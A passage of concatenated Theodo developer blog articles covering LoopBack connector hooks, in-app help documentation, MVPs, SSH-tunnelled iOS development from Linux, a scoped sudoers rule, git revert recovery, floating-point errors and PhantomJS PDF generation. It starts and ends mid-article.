server/server.js\r\n\nEnvironment variables for production\nFor different environments you might have different urls for your API.\nThe datasources.local.js file enables to use local environment variables to configure your connectors.\nFor instance, on your dev machine we use http://0.0.0.0:3000/api/ and on the production http://prod.api:3000/api/.\nYou should export this on your production machine:\nbash\r\nexport LOCAL_API_URL=http://prod.api:3000/api/\r\n\nin your datasource.local.js file, every url should look like this:\n\r\nurl: (process.env.LOCAL_API_URL || \"http://0.0.0.0:3000/api/\") + \"Stuff/{StuffId:integer}\"\r\n\nAnd if you have an API version, you should separate the url and the version:\nbash\r\nexport LOCAL_API_URL=http://prod.api:3000/\r\nexport LOCAL_API_VERSION=api/v1.0/\r\n\n\r\nurl: (process.env.LOCAL_API_URL + process.env.LOCAL_API_VERSION || \"http://0.0.0.0:3000/api/\") + \"Stuff/{StuffId:integer}\"\r\n\nAccess the headers of a request\nThe Loopback-connector-rest works fine returning the body of the response.\nBut when it comes to access other part of the response, it gets tricky.\nFor instance, in my case, I wanted to update a list of stuff after a POST request.\nThe request to get the whole list of stuff was really long, so the only way for us was to get the last, newly created item.\nIn most cases, the POST request returns the new item and the connector works fine.\nThe API I was working with responded with a code 200 and an empty body after a successful creation.\nHowever, they where sending the location of new item in the response\u2019s headers, where the id can be found.\n\n\"location\": \"http://0.0.0.0:3000/api/Stuff/stuffId\"\n\nSo I needed to access the request\u2019s headers and put the stuffID it in the body to be able use it.\nHooks\nIf you are a Loopback user you might have heard of the operations hooks.\nHooks are functions that are triggered every time an operation is done, such as:\n\nBefore a CREATE operation\nAfter a DELETE\n\nI quote the documentation:\nA typical request to invoke a LoopBack model method travels through multiple layers with chains of asynchronous callbacks. It\u2019s not always possible to pass all the information through method parameters.>\nA hook gives you access to the Loopback context ctx of the operation which contains a lot of information that won\u2019t make it to the end of your method.\nTypically: in the end of a call you get the body of the response, the headers are only available in the ctx.\nIn many case the hook is the .observe method of the model.\nIn our case this won\u2019t work.\nYou have to use the hook of the connector itself.\nAnd where do you access the connector object? During the boot!\nSo you are going to need a new file in the boot.\nin server/boot/set-headers-in-body.js\n\r\nmodule.exports = function(server) {\r\n  var APIConnector;\r\n  APIConnector = server.datasources.APIDataSource.connector;\r\n  return APIConnector.observe('after execute', function(ctx, next) {\r\n\r\n  });\r\n};\r\n\nNow inside this function you have access to every information you need:\n\nthe headers of the response: ctx.res.headers\nthe code of the response: ctx.res.body.code\nthe method of our request: ctx.req.method\n\nRemember, the hook is called every time the operation is done, the operation is a call to the connector, so each of your requests with the rest-connector will go through this function.\nIf you try the code now, every call to the API won\u2019t go through this hook because you are not calling the next() function yet.\nYou want to hook every POST request our server does and put the location from the header inside the body.\n\r\nmodule.exports = function(server) {\r\n  var APIConnector;\r\n  APIConnector = server.datasources.APIDataSource.connector;\r\n  return APIConnector.observe('after execute', function(ctx, next) {\r\n    if (ctx.req.method === 'POST') {\r\n      ctx.res.body.location = ctx.res.headers.location;\r\n      return ctx.end(null, ctx, ctx.res.body);\r\n    } else {\r\n      return next();\r\n    }\r\n  });\r\n};\r\n\nThe ctx.end method needs 3 arguments: (err, ctx, result). The result is what is send in the end, when the method of MyAPI is called.\nWarning: be careful with hooks.\nWith the code you just wrote, the connector never sends any errors after a POST request for instance.\nA way to avoid most bugs is to specify in which case you touch the ctx:\n\r\nif (ctx.req.method === 'POST' && ((ref = ctx.res) != null ? (ref1 = ref.body) != null ? ref1.code : void 0 : void 0) === 200 && ctx.res.headers.location)\r\n\nError handling\nThere can be many use of hooks, such as formatting every response you get from the API, very usefull when you work with an API that returns xml for instance.\nOr handle errors from the API before it comes to your model inside your promise.\nIn my last project, the API was a gateway, so every error they sent was a HTTP error 502 Bad Gateway when it should have been 403 Forbidden.\nIn order not to be confused with our server errors and the gateway errors, we customized the error rejection in the hook.\n\r\nmodule.exports = function(server) {\r\n  var APIConnector;\r\n  APIConnector = server.datasources.APIDataSource.connector;\r\n  return APIConnector.observe('after execute', function(ctx, next) {\r\n    var err, ref, ref1;\r\n    if (/^[5]/.test((ref = ctx.res) != null ? (ref1 = ref.body) != null ? ref1.code : void 0 : void 0)) {\r\n      err = new Error('Error from the API');\r\n      err.status = 403;\r\n      err.message = ctx.res.body.message;\r\n      return ctx.end(err, ctx, ctx.res.body);\r\n    } else {\r\n      return next();\r\n    }\r\n  });\r\n};\r\n\nConclusion\nI wanted to share the knowledge I acquired using this connector with a tutorial.\nI\u2019m using Loopback v2.22.2, if you had trouble understanding/implementing any part of this article or if you have some improvement to suggest, please contact me through the comments!\nAnd remember: always use the DEBUG=*rest when you work with the connector!\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tSammy Teillet\r\n  \t\t\t\r\n  \t\t\t\tDeveloper at Theodo  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\tThe fable\nWhen I joined the e-annuaire project, the team used to spend half a man-day per sprint writing documentation for the end-user support (EUS). When it was my turn, I screwed my courage to the sticking place and opened the Google doc:\n\nBunches of screenshots of the app, where overlaid yellow boxes are referenced on spreadsheets like this:\n\nThe spreadsheet details the origin of each piece of information referenced on any page of the app, and my role was to update them one by one.\nI clicked on the spreadsheet to open edition mode and\u2026 Uh, what??\n\nDammit! Screenshot images were simply pasted so I cannot edit the spreadsheet \u00a0I ended up creating a real spreadsheet and copying information from screenshots and I cursed the gods for what was arguably a boring work.\n(Re)Act!\nThe boredom was the initial trigger for us to react, though this is not a valid business reason; the EUS team needs documentation material.\nFilling a powerpoint presentation with ever evolving business rules is a waste of our abilities. Spreadsheets lack maintainability and we felt we should do something about it.\nThe support team\nThe support team deal with over 30 applications.\u00a0In theory, anybody in the team should be able to answer any support demand on any application.\u00a0In practice, each team member became an expert about 3-4 applications and our application only had a couple of experts who knew it well.\nThis organization introduces a single point of failure: if the two experts are missing, inexperienced team members will have to handle the app and responding time will skyrocket.\u00a0Our application is critical so that\u2019s a big deal.\nIf the specialization of the support team disappears, so does the the single point of failure!\u00a0And guess what lead the people to specialize? Poor documentation!\nWhat is a good documentation?\nA good documentation is:\n\nMaintainable: the documentation stays consistent with the application and team members can easily update it. That\u2019s why self-documenting code is so popular. The easier the documentation can be updated, the more up-to-date it is.\nShareable: only one version of the documentation exists and knowledge is available to other team members\nAvailable: distance between the problem and the solution should be as short as possible\n\nWhat does it mean for our application?\nSo we start thinking about how to build up a documentation that is simultaneously maintainable, shareable and available.\nA paper-printed documentation follows none of the three principles.\nSharePoints, Google slides and their avatars are shareable but not available i.e., there is no guarantee that each support team member has access to the latest document.\u00a0Most importantly, they are definitely not maintainable (see ##The fable).\nIn order to be available, the documentation must be reachable where the user encounters a problem i.e., in the app itself.\u00a0Let\u2019s take an example: a user call the EUS because there is a wrong phone number on a page:\n\nFor some reason, the guy answering the phone knows nothing about the e-annuaire.\u00a0In order to help him, we implemented a feature displaying bubbles that appear when you click on a \u2018show help\u2019 button:\n\nValuable information appear under the phone number, hence the documentation is available.\u00a0Now, assume the support team member reads the bubble and calls Ms Martin and discovers she left and that Ms Smith should be called.\u00a0The information in the bubble needs a refresh, so we implement a feature letting support administrate help content:\n\nTherefore, the documentation is maintainable.\u00a0Finally, we ensure that every support team member sees the same help contents so that the documentation is shareable as well.\nHow did we do it?\nInstead of spending half a man-day writing documentation, we suggested to the PO to onboard a \u201cproof of concept\u201d ticket.\u00a0Within a week, we had bubbles in profile pages.\u00a0Both the PO and the EUS team were very enthusiastic so we onboard more tickets to improve it: we spread bubbles on all pages, letting people administrate bubbles and adding contents depending on your role in the app (not only EUS team member).\nIt turned out to be a huge success: the PO and EUS team administrate help content themselves and the overall cost for developing the feature was less 3 man-days, compared to 0.5 man-day per sprint (and it is sprint #95)!\nIt was laziness that drove us first, but laziness alone is useless unless you turn it into a solution that is profitable to everybody.\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tAntoine Toubhans\r\n  \t\t\t\r\n  \t\t\t\tWeb-developer at Theodo.  \t\t\t\r\n  \t\t\r\n    \r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tNicolas Trinquier\r\n  \t\t\t\r\n  \t\t\t\tNicolas is a full stack developer. Along with his fellows at Theodo, he builds, with pragmatism, tomorrow's applications.  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\tAt Theodo, we build products everyday for our clients and for ourselves. We often deal with creating a Minimum Viable Product or MVP. But what is a MVP? How do you build a good one? \u00a0Why is it useful?\nMVP? \nWhen people talk about building a product, you often hear about POCs (proof of concept) or MVPs. But you may not know what it really means. If you are an entrepreneur with an idea, you first want to know if it solves a problem that matters to people. After that and if your idea does solve a problem worth solving, you want to know how you can address this problem in the most effective way. For that you can build a MVP.\nYour MVP is not the product with the least number of features, nor is it the product with all the features half developed\nThe goal of the MVP is to build the first version of your product so you can get feedbacks from customers and improve it. Your MVP is not the product with the least number of features, nor is it the product with all the features half developed. Even if you have a lot of features in mind, your MVP should have the one feature that solves the problem and it should work flawlessly. The pyramids illustrates this clearly.\n\nIf you read Eric Ries\u2019s Lean Startup, there are some great examples of MVP, like Food-On-The-Table: \u201cThe company did the menu-planning by hand, and they met the customer in person once a week in the Starbucks in a parking lot of the grocery store where that person did their shopping. The customer had no idea that they were the only customer or the first customer. But they learned how to serve that customer and were able to get several other customers before they invested in automation.\u201d First they try to serve their customer effectively, not to make it automated. \nI have a great idea, what do I need to build a MVP?\nFeedbacks. Always get feedbacks. We had one client at Theodo who wanted to launch its startup and wanted to build its MVP to raise money. The first time we met him, he couldn\u2019t give us any feedbacks about his future customers. You can get feedbacks even without a product built. Remember: your idea solves a problem. Which one is it? How do you want to address it? How do your customers react to your idea? Will they use your product? If not, why? If so, how do they intend to use it? You must be able to answer all these questions before starting your MVP. Keep in mind that the more you have feedbacks from your customers, the more you know how to solve their problem.\nHow do I build it?\nAt Theodo we build web applications. In my projects, I\u2019ve learnt that an easy way to build a product is to visualize it. When the customer uses your product, he wants to find one thing: the solution you propose to his problem. To build your MVP, you can visualize all the necessary steps to solve this problem. For example, you can print wireframes of the needed pages of these steps and hang them on a wall. \nTwo months ago, I had to build a marketplace for winter sports. Our client wanted us to spend a lot of time on a shiny homepage. We decided to print the different steps needed for his product to work : one user should be able to find the sport he or she wants, book it and get in touch with the coach who is providing the lesson. Our client understood immediately that the goal of his MVP was to make this user flow as efficient as possible. \nBuilding a MVP gives you the tools to adapt your product design to what the customer really needs. So next time you want to build one, don\u2019t forget: get feedbacks, focus on solving one specific problem and follow the MVP pyramid!\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tDamien Peltier\r\n  \t\t\t\r\n  \t\t\t\tDeveloper at Theodo  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\tUnfortunately there\u2019s no way* to develop an iOS app without a Mac.\nFortunately that doesn\u2019t mean you need to switch to a Macbook, there is another way.\n*No legal way.\nYou might find articles suggesting installing OS X (or macOS as it\u2019s now branded) in a virtual machine, but this breaches Apple\u2019s EULA and often involves downloading unverifiable versions from the internet. The section (2.B) also states that a business can allow multiple users to use the same Mac, so these instructions can be used for a whole development team.\nWhy?\nI\u2019m a Linux user. There are many reasons behind this but since this is a professional blog I won\u2019t go into them; suffice to say I\u2019d rather figure out the content of this post than switch to Mac.\nI\u2019ve been doing a lot of React Native development recently and while it runs Javascript internally, it uses native user interface components (rather than a webview), so you need to be able to compile the real app. Android can be built anywhere even Android but iOS is more fussy.\nThe techniques used here can also be used for any secure tunneling so even if you love the drag-to-install world you can benefit from them.\nWhat?\nI bought a Mac Mini, which now lives on my desk at home. I set up SSH to allow me to connect from anywhere and then tunneled VNC over it to allow for secure remote desktop connections. I have a copy of the iOS code on the Mac (which changes infrequently) which I can run in the simulator and through more tunneling it runs the javascript directly from my laptop.\nConfused?\nI\u2019ll go into it. But in the end, the result looks something like the screenshot at the top of the page.\nHow?\nI\u2019m glad you asked:\nUnpacking the Box (Setting Up SSH)\nOn the Mac (you\u2019ll need a display for this), open System Preferences, go to \u2018Sharing\u2019 and enable Remote Login and Screen Sharing. The Remote Login page will helpfully tell you your local IP to connect to from your development machine, use this to copy over your ssh public key. If you don\u2019t already have a key, use the ssh-keygen command and follow the prompts to create one. The easiest way to get your key over is:\n# On your development machine\r\n$ cat ~/.ssh/id_rsa.pub\r\n# Select the output and copy\r\n$ ssh user@192.168.X.Y\r\n$ nano ~/.ssh/authorized_keys\r\n# paste in contents of your public key then ctrl-x to exit\nFor security, on the Mac you want to disable password authentication, so open the file /etc/ssh/sshd_config and add the following lines. You\u2019ll need to restart ssh for them to take effect, the easiest ways being disable and re-enable remote access or reboot:\nPasswordAuthentication no\r\nPermitEmptyPasswords no\r\nChallengeResponseAuthentication no\nIf you\u2019re feeling really paranoid you can also lock down the firewall as long as sshd-keygen-wrapper can accept connections.\nThe last step is to set up port forwarding through your home router. I can\u2019t tell you how to do this as it depends on what router you have. You\u2019ll need to go to the configuration page by going to its IP address in a web browser (normally 192.168.0.1 or 192.168.1.1), it\u2019ll probably be in advanced settings somewhere under port forwarding. What you want to set up is a forward of TCP traffic from a random high numbered port (e.g. 9329) on the public side to port 22 on your Mac. The default port for ssh is 22 (and macOS seems to ignore attempts to change the config) but moving it to another port externally means that anyone trying to connect to random IPs won\u2019t find it. Mine looks like this:\n\nWiring It All Up (SSH Port Forwarding)\nNow for the interesting part, which is also generally useful for port forwarding, so feel free to replace \u2018Mac\u2019 with any remote machine you want to play with. We\u2019re going to set up an ssh configuration which will allow you to reuse your settings without having to remember the whole command. You can do the same without a config and I\u2019ll give you that too.\nThe main concepts here are \u2018local\u2019 and \u2018remote\u2019 forwards. Simply put, SSH binds to a port on one side, this prevents any other processes from binding to that port, but allows it to accept connections. When anything tries to connect to the port it forwards that request to the other port on the other machine, so it goes to whatever is bound to the other port.\nFor example VNC will be bound to port 5900 on the Mac, waiting for a remote machine to connect. We want SSH to bind to a port on our development machine and forward any connections to the Mac on port 5900. This is called a \u2018local\u2019 forward as the bound port is local.\nIn my example I\u2019ll be setting up for React Native development, so I want to run services like the packager locally. It\u2019ll transpile the Javascript and send it to the device when running in development mode, allowing for hot reloading and other such goodies. It\u2019ll be bound to port 8081 by default, and when I run the app on the Mac it\u2019ll try to connect to 8081, so I want SSH to be bound to the remote port 8081 and forward the connections to local port 8081. You might have guessed this is called a \u2018remote\u2019 forward.\nFor this step you\u2019ll need the public IP of your Mac\u2019s location. The answer to this (and to many other questions) can be discovered by visiting this link from your Mac. Unless you\u2019ve paid for a static IP, it will change, but for me this hasn\u2019t happened more than every few months. I don\u2019t have a good solution to this yet other than changing your config whenever it changes (but try the link I just gave). On your dev machine open a file at ~/.ssh/config and add the following (indentation is important):\nHost mac-mini-vnc\r\n  Hostname <your home network's public IP here>\r\n  Port <your public ssh port here>\r\n  User <username on Mac>\r\n  # VNC\r\n  LocalForward 5900 127.0.0.1:5900\r\n  # React Native packager\r\n  RemoteForward 8081 127.0.0.1:8081\r\n  # Redux remote debugger\r\n  RemoteForward 8000 127.0.0.1:8000\r\n  # Default port for node.js, so my development backend\r\n  RemoteForward 3000 127.0.0.1:3000\nYou can activate all this by running ssh mac-mini-vnc, optionally adding the -N or -f options to not open a remote terminal and to run in the background respectively. If you want to run the above without a config (with the -fN), the command is:\nssh -fN -p <port> -L 5900:127.0.0.1:5900 -R 8081:127.0.0.1:8081 -R 8000:127.0.0.1:8000 -R 3000:127.0.0.1:3000 <user>@<IP address>\nWhich is why I use a config file.\nStarting It Up\nNow you should be able to open a VNC client on your development machine (I use KRDC) and connect it to <user>@localhost:5900. You\u2019ll need to put in the username and password for your Mac and you should see your desktop. I needed to turn down the screen resolution on the Mac to improve the responsiveness, unfortunately this can only be done while the real screen is on.\nYou need to have the iOS part of the app built and run on the Mac so you\u2019ll need to follow the instructions for setting up React Native iOS development. Once you\u2019re done clone your project and npm install the dependencies as these can include native parts. You\u2019ll also want to have the project set up on your development machine, and start the packager with react-native start. Now you can finally run the project on the Mac by running react-native run-ios, this will build the app and deploy it to the iOS simulator.\nYou\u2019ll still need to set up Redux and a back-end server to make use of the other routes, but for now you can enjoy the fun of React Native by making a change on your development machine, go to the VNC window, hit meta-r (cmd-r to the mac, it\u2019ll most likely be a windows-r on your machine), and see the changes.\nFinal Thoughts\nSo there you go, iOS app development from a Linux machine. Admittedly it requires buying a Mac, but you don\u2019t need to change your normal operating system or buy an overpriced Macbook (Mac Minis start at \u00a3400/550\u20ac). It might not be as easy as doing it from a Mac, but you\u2019re probably not using Linux because it\u2019s easy.\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tRichard Miller\r\n  \t\t\t\r\n  \t\t\t\tArchitect-Developer at Theodo UK.  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\t\u00a9 xkcd\nHere is how I managed to save time on my PHP project by enabling restarting services automatically during deployment.\nBasic capistrano configuration\nWhen I work on PHP projects I deploy using Capistrano, a tool that enables scripting of deployment tasks.\u00a0During my previous project, I had to manually log in to my server and restart the php-fpm service after each deployment.\u00a0I wasted almost one hour of my time every week running sudo service php5-fpm restart 10 times a day.\u00a0Moreover, every once in a while I forgot to restart the service and I had to spend 30 minutes more to find out why I couldn\u2019t see my new feature on my website.\nTo save time, I wanted capistrano to do it for me:\ntask :restart_php do\r\n  on roles(:app) do\r\n    execute \"sudo service php5-fpm restart\"\r\n  end\r\nend\r\n\nTo do so, I needed superuser permissions.\u00a0I considered giving sudo rights to the application user, but this would represent a major security issue: say there is a security breach on your application that enables an attacker to take control over the application user, they could take control over the whole server.\nA solution is to grant superuser permission on a specific command.\nIntroducing the /etc/sudoers file and visudo command\nLog in to your server as root and run sudo visudo.\u00a0Visudo enables you to edit the /etc/sudoers file, in which your computer grants superuser permissions.\nI added the following line:\nwww-data ALL=(root) NOPASSWD: /usr/sbin/service php5-fpm restart\r\n\nThe line is divided into 4 parts:\n\nwww-data is the user you want to grant permissions to.\nALL filters users logged in from ALL hosts name\n(root) www-data has root permissions on the following command\nNOPASSWD: /usr/sbin/service php5-fpm restart enables www-data to run only this exact command /usr/sbin/service php5-fpm restart without being asked any password.\n\nYou can now understand why this line in the file is the source of root superpowers:\nroot ALL=(ALL) ALL\r\n\nWith great power comes great responsibilities\nBefore you enable all users to run sudo commands without being asked any password (which is possible but strongly advised against), take caution using visudo: granting superuser commands must be used with parcimony.\nFinally, you may ask yourself why I used visudo instead of vim /etc/sudoers file.\u00a0Never edit directly the /etc/sudoers file.\u00a0Visudo includes checks before saving the edited file: it prevents it from syntax errors that would cause major superuser problems on your computer.\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tPaul Jehanno\r\n  \t\t\t\r\n  \t\t\t\tDeveloper at Theodo  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\tLet me tell you my story about git, conflicts and reverts.\nOn a project, I start a feature on a branch, open a pull request towards master branch and merge it by mistake before finishing my code.\nNo git story would be complete without drawings.\n\nOops!\nWhat is the clean way to fix my mistake?\nMy first idea is to quickly push --force to master branch to cancel the merge when nobody is looking.\nI read on the Internet that this is a bad idea on a shared branch.\nTherefore, I decide to do it the \u201cclean way\u201d, which in my case is revert.\nI can revert manually on the command-line, or thanks to GitHub directly from the merged pull-request!\n\nMy git history now looks like this:\n\nNow is the time to deploy my code.\nI can\u2019t merge my feature, what\u2019s going on?\nI\u2019ve added my missing commit, I reopen a pull request and see this on GitHub:\n\nHow does a merge commit work?\nA merge commit takes the diff between the common ancestor and the first parent commit and the diff between the common ancestor and the second parent commit and applies them together.\n\nLet\u2019s look at my git history:\n\nNow suppose my feature introduced a new file script.sh, and that I modified it in my feature branch after the revert.\nLet\u2019s see what this means:\n\nThat\u2019s great!\nI understand that the revert commit is the culprit here.\nBut how do I get back on my feet and merge my feature?\nSolution: revert the revert!\nI want to avoid the revert commit in my merge, therefore I rebase my feature branch on master branch so that the merge commit common ancestor is after the revert commit.\n\nI can\u2019t apply my feature commit on master branch because script.sh does not exist.\nI need a commit before that reinstates script.sh and that is not already merged into master branch.\nThat\u2019s where the magic occurs, I revert the revert commit, and then cherry-pick my new commit.\nLet\u2019s see this in action:\n\nIt\u2019s working, at last!\nEpilogue\nThis solution requires a good visualization of the situation to understand and implement it.\nAlways draw when you have a problem with git.\nThe best way to avoid all this work is to avoid the mistake in the first place:\nbe careful when merging your pull requests.\nI rejected the push force method because it is dangerous, but my solution is quite thorny!\nThere are situations where push force is indeed a good choice, even on a shared branch.\nBe sure to warn your collaborators and explain to them the necessary steps to recover from it if needed.\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tTristan Roussel\r\n  \t\t\t\r\n  \t\t\t\tAfter graduating from l'\u00c9cole Normale Sup\u00e9rieure in mathematics, Tristan explored various jobs: trading, theoretical research in computer science, data analysis and business development. He finally found his way at Theodo in 2013 as a web developer-architect. He works mainly with Symfony and front-end JavaScript frameworks, and is particularly fond of git.  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\tFloats\nWe use computers every day to solve mathematical issues, from how much taxes should I apply to my users\u2019 basket to computing next week\u2019s weather forecast.\nSolving most of those problems is nowhere near easy, and would be harder still if we didn\u2019t use mathematics to reason, represent and compute insane amounts of data.\nBut the code we execute on our computers isn\u2019t exactly the same as the doing the maths we try to represent.\nFor instance, the plus operator does not yield the same results as a real addition.\nDon\u2019t believe me? Run 0.1 + 0.2 on the javascript console of the browser you are using to read this article.\nSpoiler alert: you won\u2019t get 0.3 (if you do, let me know which browser you are using).\nIsn\u2019t this a JS issue ?\nThis issue comes from how computers represent decimal numbers, you could try doing the same addition with python, C\u2026 and the result would be 0.30000000000000004.\nThis rounding error is caused, deep down, by the fact that our computer only can store a finite amount of data (ref. needed) when there is an infinite amount of decimal numbers (ref. needed).\nA solution ?\nSome languages, like PHP (tested with PHP 5.5.14) will actually return 0.3 for 0.1 + 0.2.\nIn this case do we really have a solution? Were PHP developers able to solve this problem many other languages developers failed to? Of course not, the result was simply rounded, which can be made apparent by running some other cleverly crafted additions:\nFor example 0.30000000000000004 - 0.3 would yield 5.55111512313e-17 When 0.30000000000000004 - (0.1 + 0.2) would yield 0\nA matter of floats and death\nOne could argue that, to display the taxes amount on an amazon basket, rounding to two digits would be more than enough (on all the monetary systems I know of), and a 0.00000000000004 error on the displayed amount would be of little to no consequence.\n\nFloats are a deadly issue, literally. See the Patriot Missile Failure on February 25, 1991, which caused the death of 28 soldiers. The main cause for that failure was that 0.1 is not a round number, as far as floats are concerned.\nSo yes, the gap between the mathematics we use to reason about software and its implementation can be a problem, and a deadly one.\nHow can we solve this\nSome of those problems have been solved on some languages using rational arithmetic instead of floating point arithmetic.\nUsing rational arithmetic does have a performance (both in terms of CPU and memory) impact, and does not solve all rounding errors (specially with irrational numbers).\nThe only solution I can recommend is to always assume that a floating point operation is inexact and be ready to handle the consequences, which means:\n\nNot using the equality operator with floats, ever\nAlways round/floor/whatever the result you display to the user (no one wants to see 5.55111512313e-17\u00b0C appear as the tomorrow\u2019s temperature)\nAvoid using floats altogether if possible (for example, one could use integers to represent cents instead of float value for dollars, euros or any other currency that could have decimal values)\n\nSome more shenanigans\nAs we\u2019ve seen, the implemented operators does not yield the same results as their mathematical counterparts, and they also does not share the same properties.\n\nThe + is not associative (with and associative operator, a + (b + c) = (a + b) + c)\nThe == (equality) is not transitive (if it was, that would mean that if a == b and b == c then a == c)\nThe == does not even have to be reflexive (by design in C)\n\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tCl\u00e9ment Hannicq\r\n  \t\t\t\r\n  \t\t\t\tDeveloper at Theodo  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\t\nDid you ever have to generate PDF files in a web application?If you did, chances are that you liked it as much as that 5-hours train journey seating next to a crying baby after a sleepless night\u2026I was on a project where we had to generate a 8-pages pdf with footers, headers and include some data from our app.We asked other people to know which tool can do the job.Everyone tells us that it\u2019s:\n\nA nightmare to generate a great pdf with html\nHeaders and footers are always a hard task\nA nightmare\nVery long\nDid I already said a nightmare?\n\nAfter all these interviews, the task seemed hard.But we wanted to make some search to be sure there is no tool out there that can make the job easily.And we found one.It is a tool that:\n\nIs easy to install\nIs easy to use\nMakes great pdf in no time\n\nThis tool is phantomjs, which is a headless browser usually used to test our pages.Let\u2019s dig into this and see how we can now master the server side pdf generation across all our apps!\nGenerate the first PDFs\nIn order to generate your first page, you need to download phantomjs (you can use npm).The next step is to write the script: \n// mypage.js\r\n\r\nvar page = new WebPage();\r\nvar html = \"<div>My first page!!</div>\";\r\n\r\npage.setContent(html, null);\r\npage.onLoadFinished = function (status) {\r\n  page.render(\"mypdf.pdf\");\r\n  phantom.exit();\r\n};\r\n\nYou can now generate your pdf file using:\n./path/to/phantomjs mypage.js\r\n\nPretty easy right? But wait, the page is in landscape mode, I want it in portrait!No problem, phantomjs can easily handle that.In fact, the page object has a paperSize property you can edit to make the page look like whatever you want.For example: \n// mypage.js\r\n\r\nvar page = new WebPage();\r\nvar html = \"<div>My first page!!</div>\";\r\n\r\npage.setContent(html, null);\r\npage.paperSize = {\r\n  format: \"A4\",\r\n  orientation: \"portrait\",\r\n  margin: { \r\n    left:\"1cm\", \r\n    right:\"1cm\", \r\n    top:\"1cm\", \r\n    bottom:\"1cm\" \r\n  }\r\n};\r\n\r\npage.onLoadFinished = function (status) {\r\n  page.render(\"mypdf.pdf\");\r\n  phantom.exit();\r\n};\r\n\nYou can now generate again and you have a pdf in portrait mode, with margins around to contain the body of your page.But it is not good to have your js and your html in the same file\u2026So let\u2019s move the html in a file named myhtml.html, in the same folder.You can reference to this file using page.open: \n<!-- myhtml.html -->\r\n<!DOCTYPE html>\r\n<html>\r\n  <head>\r\n    <meta charset=\"utf-8\" />\r\n  </head>\r\n  <body>\r\n    <div>My first page!!</div>\r\n  </body>\r\n</html>\r\n\n// mypage.js\r\n\r\nvar fs = require(\"fs\");\r\nvar page = new WebPage();\r\npage.paperSize = {\r\n  format: \"A4\",\r\n  orientation: \"portrait\",\r\n  margin: { \r\n    left:\"1cm\", \r\n    right:\"1cm\", \r\n    top:\"1cm\", \r\n    bottom:\"1cm\" \r\n  }\r\n};   \r\n\r\npage.open(\r\n  \"file://\" + fs.absolute(\"./myhtml.html\"), //myhtml.html is in the same folder\r\n  function (status) {\r\n    page.render(\"mypdf.pdf\");\r\n    phantom.exit();\r\n  }\r\n);\r\n\nOk that\u2019s great!But I need multiple pages with headers and footers!To add pages in your PDF, you use the css rules page-break-after and page-break-before.For example, the following css will render two pages: \n<style>\r\n#page {\r\n  page-break-after: always;    \r\n}\r\n</style>\r\n<div id=\"page\">My first page</div> \r\n<div>My second page</div>\r\n\nNow you can add multiple pages, just need headers and footers and you are good to go!In fact, adding headers and footers is quite simple, you have to edit again the paperSize property: 